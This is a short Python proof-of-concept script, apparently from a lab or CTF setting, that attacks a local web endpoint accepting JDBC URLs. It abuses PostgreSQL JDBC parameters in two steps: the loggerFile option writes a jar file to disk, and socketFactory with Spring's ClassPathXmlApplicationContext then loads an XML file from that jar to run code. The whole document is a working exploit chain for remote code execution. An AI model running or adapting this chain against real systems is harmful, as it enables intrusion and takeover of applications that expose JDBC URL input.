from urllib import parse

import requests

with open("./ascii-jar-master/1.jar", 'rb') as f:
    data = f.read()


url2 = parse.quote(f"jdbc:postgresql:///?loggerLevel=DEBUG&loggerFile=D:/ascii.jar&{data}")

url = f"http://127.0.0.1:8081/jdbc?url={url2}"

print(url)

proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# response = requests.get(url, proxies=proxy)

url1 = parse.quote("")
url2 = parse.quote("jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=jar:file:///D:/ascii.jar!/1.xml")

url = f"http://127.0.0.1:8081/jdbc?url={url2}"

res = requests.get(url, proxies=proxy)